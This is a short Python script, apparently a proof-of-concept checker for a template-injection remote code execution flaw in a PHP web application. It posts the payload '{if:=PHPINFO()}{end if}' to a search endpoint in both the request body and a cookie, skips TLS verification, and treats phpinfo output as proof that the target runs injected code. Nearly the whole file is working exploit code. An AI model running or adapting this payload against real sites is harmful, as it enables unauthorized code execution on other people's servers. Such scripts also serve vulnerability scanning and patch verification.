import requests
import base64
import requests, urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def doCheck(url):
    target = url + '?location=search'
    body = 'keys={if:=PHPINFO()}{end if}'
    headers = {
        'Content-Type': 'text/plain',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Cookie': 'PHPSESSID=rbuhrqqhoctntnak8slkascqp1; keys=%7Bif%3A%3DPHPINFO%28%29%7D%7Bend+if%7D%0D%0A'
    }
    response = requests.post(target, body, headers=headers, timeout=20, verify=False)
    if 'phpinfo' in response.text:
        return target
    else:
        return False


if __name__ == '__main__':
    print(doCheck(""))
